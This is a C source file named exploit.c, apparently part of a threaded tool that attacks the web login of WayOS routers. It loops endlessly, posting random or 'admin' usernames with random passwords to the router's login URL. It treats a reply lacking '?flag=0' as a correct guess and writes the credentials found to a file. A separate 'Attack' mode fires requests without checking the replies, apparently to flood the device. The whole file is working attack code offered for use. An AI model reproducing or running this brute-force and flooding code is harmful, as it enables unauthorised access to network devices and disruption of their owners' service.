/* File : exploit.c
 * Auth: isinstance
 * Date: 20171031
 * Mail: no
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <pthread.h>

#include "http.h"
#include "rand.h"
#include "debug.h"
#include "exploit.h"

int write_passwd(const char *up)
{
    /*
     * Write the correct username and passwd to file
     */

    FILE *success_fp;
    char file_name[50];
    sprintf(file_name, PASSWD_FILE_PATH, up);
    success_fp = fopen(file_name, "w");
    if (!success_fp)
    {
        debug(1, 1, "Could NOT open file at - %s", PASSWD_FILE_PATH);
        return 1;
    }
    fprintf(success_fp, "%s", up);
    fclose(success_fp);
    return 0;
}

int judge(int debug_level, const char *inbuf)
{
    /*
     * If we have the wrrong password or username
     * This fucntion will return 1
     * If we have the right password or username
     * This function will return 0
     */

    debug(debug_level, 2, "Function judge()");
    debug(debug_level, 2, "Function judge inbuf: %s", inbuf);
    char *ptmp = NULL;
    debug(debug_level, 2, "Start strstr");
    ptmp = (char *)strstr(inbuf, "?flag=0");
    debug(debug_level, 2, "End strstr");
    if (!ptmp)
    {
        // Not found the '?flag=0' mean successful
        debug(debug_level, 2, "Function judge() return 0");
        return 0;
    }
    debug(debug_level, 2, "Function judge() return 1");
    return 1;
}

int success_or_not(int debug_level, char *result)
{
    /*
     * In here to found out the password and username is correct or not
     * Will not call if you are Attack mode
     */
    debug(debug_level, 2, "Function success_or_not() here");
    int result_status = judge(debug_level, result);
    debug(debug_level, 2, "Function success_or_not() return %d", result_status);
    return result_status;
}

int unlimited_ex(struct UNLIMITED_INPUT *input)
{
    /*
     * Exploit unlimited
     */

    struct UNLIMITED_INPUT *pinput = (struct UNLIMITED_INPUT *)input;
    struct RAND_INPUT *rinput = (struct RAND_INPUT *)malloc(sizeof(struct RAND_INPUT));
    struct HTTP_POST_ARG *hinput = (struct HTTP_POST_ARG *)malloc(sizeof(struct HTTP_POST_ARG));
    //printf("unlimited NotRecv: %d\n", pinput->NotRecv);

    char *rand_passwd = NULL;
    char *rand_user = NULL;
    char user_name[10] = "admin";

    char *post_data = NULL;
    char *return_value = NULL;
    char *write_space = NULL;
    //char pdebug[BUFFER_SIZE] = {'\0'};
    int num_loop = 0;
    int debug_level = pinput->DebugMode;

    write_space = (char *)calloc((MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100), sizeof(char));
    rand_passwd = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + 1, sizeof(char));
    post_data = (char *)calloc(MY_RAND_MAX_PASSWORD_LENGTH + MY_RAND_MAX_USERNAME_LENGTH + 100, sizeof(char));
    return_value = (char *)calloc(MY_HTTP_DEFAULT_RESPONSE_LENGTH, sizeof(char));

    for (;;)
    {
        // Now we make the 'passwd' random
        // ---------> rand_string is here
        // Flag = 1, output the random password
        rinput->RandFlag = 1;
        rinput->NumLoop = num_loop;
        rinput->Seed = pinput->ThreadSeed;
        rinput->DebugMode = pinput->DebugMode;

        rand_string(rand_passwd, rinput);

        if (pinput->RandFlag == 1)
        {
            rand_user = (char *)calloc(MY_RAND_MAX_USERNAME_LENGTH + 1, sizeof(char));
            rinput->RandFlag = 0;
            rand_string(rand_user, rinput);
        }
        else
        {
            rand_user = user_name;
        }

        // rand user fix
        sprintf(post_data, POST_MODEL, rand_user, rand_passwd);

        // Here we go --->
        hinput->URL = POST_URL;
        hinput->PostData = post_data;
        hinput->DebugMode = pinput->DebugMode;
        hinput->Attack = pinput->Attack;
        hinput->ReturnStr = return_value;
        http_post(hinput);
        return_value = hinput->ReturnStr;
        debug(debug_level, 1, "Return value: %s", return_value);
        //return_value = http_post(POST_URL, post_data, pinput->DebugMode, pinput->NotRecv);

        if (pinput->Attack != 1)
        {
            // Guess the password
            debug(debug_level, 2, "Start judge");
            if (success_or_not(debug_level, return_value) == 0)
            {
                debug(debug_level, 2, "Found the result");
                printf("We found the password!\n[--->%s : %s<---]\n", rand_user, rand_passwd);
                sprintf(write_space, "%s - %s\n", rand_user, rand_passwd);
                if (write_passwd(write_space) == 1)
                {
                    debug(debug_level, 1, "Write the username and password failed");
                    return 1;
                }
            }
        }

        // Make sure the num_loop crontrol
        ++num_loop;
        if (num_loop >= sizeof(int))
        {
            num_loop = 0;
        }
    }
    free(pinput);
    free(rinput);
    free(hinput);
    free(write_space);
    free(rand_passwd);
    free(post_data);

    return 0;
}

//void *exploit(void *input)
void *exploit(const struct INPUT_ARG *input)
{
    /*
     * Exploit the WayOS router now
     */

    char *rand_passwd = NULL;
    char *rand_user = NULL;

    // struct
    struct INPUT_ARG *tmp = (struct INPUT_ARG *)input;
    debug(tmp->DebugMode, 2, "Here is exploit function");

    struct UNLIMITED_INPUT *punlimiteds = (struct UNLIMITED_INPUT *)malloc(sizeof(struct UNLIMITED_INPUT));

    punlimiteds->DebugMode = tmp->DebugMode;
    punlimiteds->ThreadSeed = tmp->ThreadSeed;
    punlimiteds->Attack = tmp->Attack;

    punlimiteds->RandFlag = tmp->RandFlag;

    debug(tmp->DebugMode, 1, "Start unlimited method");
    //printf("exploit NotRecv: %d\n", punlimiteds->NotRecv);
    unlimited_ex(punlimiteds);
    free(punlimiteds);
    free(rand_user);
    free(rand_passwd);
    pthread_exit((void *)0);
}